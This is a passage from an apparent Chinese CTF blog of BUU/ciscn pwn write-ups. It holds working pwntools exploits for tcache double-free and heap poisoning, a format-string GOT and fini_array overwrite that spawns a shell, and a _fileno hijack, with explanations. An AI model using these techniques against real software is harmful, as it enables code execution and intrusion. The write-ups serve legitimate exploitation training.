    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:'</span><span class="token punctuation">)</span>
    mix<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
    unmix<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        unmix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">0x99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    unmix<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
    base<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>unmix<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base
        
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
base<span class="token operator">=</span>decode<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
heap_base<span class="token operator">=</span>base<span class="token operator">&lt;&lt;</span><span class="token number">12</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
base<span class="token operator">=</span>decode<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> base<span class="token operator">-</span><span class="token number">0x21ace0</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
environ<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'environ'</span><span class="token punctuation">,</span>environ<span class="token punctuation">)</span>
<span class="token comment"># debug('b *$rebase(0x1395)')</span>
<span class="token comment">#后续利用防止tcache为空</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#---</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#choice 5，得到magic address，并有0x10个修改的空间，而不是8个</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'address: '</span><span class="token punctuation">)</span>
magic_address<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
start_address <span class="token operator">=</span> magic_address<span class="token operator">-</span><span class="token number">0x12be</span>
leak_info<span class="token punctuation">(</span><span class="token string">'magic_address'</span><span class="token punctuation">,</span>magic_address<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'start_address'</span><span class="token punctuation">,</span>start_address<span class="token punctuation">)</span>
<span class="token comment">#修改tcache chunk的bk值，使其可以double free</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'data:'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#指向tcache_prethread_struct</span>
heap_addr<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>
fd<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">^</span>heap_addr
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token comment">#修改tcache链个数，2.35的是两个字节代表一个</span>

edit<span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">'\x05\x00'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#修改fd，当前堆地址头右移12位^要存储在fd中的堆地址的data地址</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
heap_addr<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>
fd<span class="token operator">=</span>environ<span class="token operator">^</span>heap_addr
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack<span class="token operator">=</span>decode<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span><span class="token comment">#rbp</span>
leak_info<span class="token punctuation">(</span><span class="token string">'stack'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> <span class="token number">0x4010</span><span class="token operator">+</span>start_address
ptr_addr <span class="token operator">=</span> <span class="token number">0x4040</span><span class="token operator">+</span>start_address
leak_info<span class="token punctuation">(</span><span class="token string">'flag_addr'</span><span class="token punctuation">,</span>flag_addr<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'ptr_addr'</span><span class="token punctuation">,</span>ptr_addr<span class="token punctuation">)</span>
<span class="token comment">#修改ptr，就可以直接指向返回地址，并写backdoor</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
heap_addr<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x3f0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>
fd<span class="token operator">=</span><span class="token punctuation">(</span>ptr_addr<span class="token punctuation">)</span><span class="token operator">^</span>heap_addr
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
<span class="token comment">#ptr直接指向返回地址，绕过堆内存对齐检查</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># debug('b *$rebase(0x1493)')</span>
edit<span class="token punctuation">(</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>magic_address<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#栈对齐</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="8-BUU-ciscn-2019-sw-1（32位格式化字符串，fini-array利用）"><a href="#8-BUU-ciscn-2019-sw-1（32位格式化字符串，fini-array利用）" class="headerlink" title="8.BUU ciscn_2019_sw_1（32位格式化字符串，fini_array利用）"></a>8.BUU ciscn_2019_sw_1（32位格式化字符串，fini_array利用）</h2><p>一道很简单的格式化字符串题，只开了NX，学到了fini_array的利用方法，看一下，可以看到是很简单的格式化字符串利用，修改printf的got指针，指向system的plt，这样调用printf就会调用system，但有一个问题就是程序需要利用两次，所以这道题利用了fini_array,在main函数调用完成后，<strong>会调用fini_array数组中的每一个函数指针</strong>。所以我们只要修改这个数组的第一个函数指针，让他指向main，这样就可以第二次利用了，在想是否可以修改栈上的返回地址为main，想了一下，虽然可以泄露栈地址来确定返回地址在栈上的位置，但因为只有一次利用，泄露了后面就用不了了，所以看来还是只能用fini_array</p>
<p><img src="/images/v2-9f37f35f04fda3f407e2be9944cf02ef_720w.png" alt="img"></p>
<p>通过ida快捷键Ctrl+S查找fini_array的地址：</p>
<p><img src="/images/v2-d0192eed8a22f52c886a2ecb2002c96a_720w.png" alt="img"></p>
<p>再找出printf的got，system（只开了nx，不会变，先泄露一次就行），后面就是通过格式化字符串来修改就行了，给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./aaa'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28841</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

main <span class="token operator">=</span> <span class="token number">0x08048534</span>
printf_got <span class="token operator">=</span> <span class="token number">0x0804989c</span>
system_plt <span class="token operator">=</span> <span class="token number">0x080483d0</span>
<span class="token comment">#</span>
fini_array <span class="token operator">=</span> <span class="token number">0x0804979c</span>

sys_high <span class="token operator">=</span> <span class="token punctuation">(</span>system_plt<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span>
sys_low <span class="token operator">=</span> system_plt<span class="token operator">&amp;</span><span class="token number">0xffff</span>
main_high <span class="token operator">=</span> <span class="token punctuation">(</span>main<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span>
main_low <span class="token operator">=</span> main<span class="token operator">&amp;</span><span class="token number">0xffff</span>
<span class="token comment"># sys_high = 0x0804</span>
<span class="token comment"># sys_low = 0x83d0</span>
<span class="token comment"># main_high = 0x0804</span>
<span class="token comment"># main_low = 0x8534</span>
payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span>
<span class="token comment">#高位都要写为0x0804，最小</span>
payload<span class="token operator">+=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sys_high<span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf_8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%4$hn%5$hn'</span>
<span class="token comment">#写sys_low,第二小</span>
payload<span class="token operator">+=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sys_low<span class="token operator">-</span>sys_high<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf_8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%6$hn'</span>
<span class="token comment">#写最大的main_low</span>
payload<span class="token operator">+=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>main_low<span class="token operator">-</span>sys_low<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf_8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%7$hn\x00'</span>
debug<span class="token punctuation">(</span><span class="token string">'b *0x0804858E'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>格式化字符串又有好久没做了，差点又忘了，比如格式化字符串通过%8$hn这样向第8个位置写数据的意思是向第8位存储的这个指针指向的地方写数据，看来该做做这种的题了。</p>
<h2 id="9-BUU-ciscn-2019-final-2-doublefree-fileno劫持"><a href="#9-BUU-ciscn-2019-final-2-doublefree-fileno劫持" class="headerlink" title="9.BUU ciscn_2019_final_2(doublefree,fileno劫持)"></a>9.BUU ciscn_2019_final_2(doublefree,fileno劫持)</h2><p>很有意思的一道题，看了wp还是做了挺久的，记录一下，2.27的一道堆题，保护全开，加了沙箱，不能execve，虽然是一道菜单题，但也需要理清楚逻辑。</p>
<p><img src="/images/v2-3bd47646cc7cb7be57d67049e0475540_720w.png" alt="img"></p>
<p>在init中有本题的重点：</p>
<p><img src="/images/v2-51321062a925f5ee8f23904e18542144_720w.png" alt="img"></p>
<p>读入flag后将其fd指针改为666，也就是将flag文件流重定向到666文件描述符，那么我们需要做的就是将其给读取出来，这里是利用stdin的_fileno，因为IO函数最终实现读(0)或写(1)都是依据其_fileno成员作为read或write系统调用的第一个参数，即文件描述符。</p>
<p><img src="/images/v2-16b61b8d88a1be467263c4136efa3b1d_720w.png" alt="img"></p>
<p>在allocate函数中，给出了两种malloc，一种大小0x20，一种0x10，每种分别给了一个指针，注意这个bool变量，存储在bss上</p>
<p><img src="/images/v2-29e7c69a8e80e23ee14f6f891062e33b_720w.png" alt="img"></p>
<p>delete也是两种，在释放后会bool改为0，不让再释放，但很简单就能绕过，存在很明显的UAF漏洞</p>
<p><img src="/images/v2-0aadbd33b80c405edbc493fb968afb34_720w.png" alt="img"></p>
<p>show函数只让用3次，且输出的是32位的%d，也就是说我们不能将chunk中的内容完整的泄露出来。</p>
<p><img src="/images/v2-aaa7a39358206e7f3122bc3e262fd586_720w.png" alt="img"></p>
<p>最后的byebye中，看似只是一个输入输出，但这里就是我们最后输出flag的地方。</p>
<p>那接下来就来看一下这道题是怎么做的：</p>
<p>因为存在UAF，又是2.27，所以很明显会想到利用这里，一样的，我们想要泄露libc，但因为malloc的大小是固定的，且我们只能控制最后一个chunk，所以我们需要其他办法来泄露libc。这道题的思路是这样的，在实现doublefree后，将tcache指向前置的chunk的size位，修改size，让其可以进入unosrtbin，从而泄露libc信息：</p>
<p><img src="/images/v2-84644b40eb50359d01c9820a81cd9d75_720w.png" alt="img"></p>
<p>先来看怎么做到的，先到double free的地方：</p>
<p><img src="/images/v2-cf4e1642de0ea34ad17a3b6091bc8a82_720w.png" alt="img"></p>
<p>这时候show就可以接收到这个chunk存储的0x55c0f12d32f0的两个低字节（因为是申请的0x10大小的chunk，show就只有这么多）接下来要做的也很简单，我们要修改一个chunk的size，在这里，我们要将0x55c0f12d3250这个chunk的大小改为0x90，申请的多余的0x20大小的chunk也是为了合并而不让堆空间乱掉，我们通过show，可以得到0xf0,通过偏移得到0x30大小的chunk的后两个字节，现在把tcache中的被doublefree的chunk取出并覆盖最后两字节</p>
<p><img src="/images/v2-a826db6b23ab2c3dc72dae6df1947999_720w.png" alt="img"></p>
<p>而我们知道，tcache是指向数据段的，但0x50这里是这个chunk的size字段，那么这时候再将其申请出来就是改他的size了，下图可以看到修改成功了，这里要注意，<strong>最开始一直写的是0x90</strong>，<strong>会出错，卡了很久</strong>，因为0x90的话pre_inuse位为0，presize是0x90，后面想要释放这个chunk到unsortbin就会和被看做释放的<strong>pre_chunk</strong>进行unlink，而这个chunk前面是tcache_prethread_struct，pre_chunk并不存在，就会有问题。就会出错。</p>
<p><img src="/images/v2-011fbec877dae8328f8f929f8170245d_720w.png" alt="img"></p>
<p>解决了这个问题就可以继续了，接下来就反复利用doublefree，将大小为0x90的tcache填满，再释放，就进入unsortbin了</p>
<p><img src="/images/v2-ff1103650617c4771a15a1801f7df23a_720w.png" alt="img"></p>
<p><img src="/images/v2-e711bad1f4d138eea6712aafad0d47bb_720w.png" alt="img"></p>
<p>那接下来我们就可以通过show来泄露libc信息了，但同样的，我们最多只能泄露其后四字节，图上就是<strong>0xbefd3ca0 ,**我们无法完整的得到libc，但我们想要的<em>fileno(**位置在&amp;_IO_2_1_stdin</em>+0x70</strong>)的地址与main_arena的偏移是固定的，且相差不远。在这里再来理一下题目的思路，我们的目标是想要将_fileno的值覆盖为666，这样输入的时候就会把flag读入了。</p>
<p><img src="/images/v2-a74675e6e7928b1c0428c2c759253546_720w.png" alt="img"></p>
<p>所以我们可以利用后4字节和之前做的一样，把<code>_fileno</code>的后四字节算出后进行覆盖，让其进入tcache中，再取出就可以修改了，注意看，这时候的tcache中是有main_arena的残留的，所以我们只要修改这里就好了，但这样又有一个问题了，我们只能申请到0x20和0x30大小的chunk，怎么获取到这里的<strong>0x557110e9c250</strong> 呢，我们这时候如果申请一个chunk，将_fileno的后四字节写入，就会从unsortbin进行切割，我们的fileno就进入了tcache，而被切割剩余的unsortbin就没用了，将其申请掉</p>
<p><img src="/images/v2-d6c25d12f6960f20a23663520d83ec77_720w.png" alt="img"></p>
<p><img src="/images/v2-30af21840af7e392161bc1d7853afe2b_720w.png" alt="img"></p>
<p>接下来再做一次doublefree，获得指向了_fileno的chunk的地址的后四字节</p>
<p><img src="/images/v2-77e40d635d7febd725eef59ee9b2bca7_720w.png" alt="img"></p>
<p>再将这个0x30大小的chunk取出，修改后四字节为指向了_fileno的chunk的地址，再这里也就是将0xc0覆盖为了0x60，再取两次，接下来就可以取出fileno了：</p>
<p><img src="/images/v2-556a828e7d556826ca4f0191c80b7c29_720w.png" alt="img"></p>
<p>再取一次，修改值为666，就完成了！调用一次byebye，输出flag：</p>
<p><img src="/images/v2-19e4a04c803d7b18bad56450c3e3199e_720w.png" alt="img"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28409</span><span class="token punctuation">)</span>

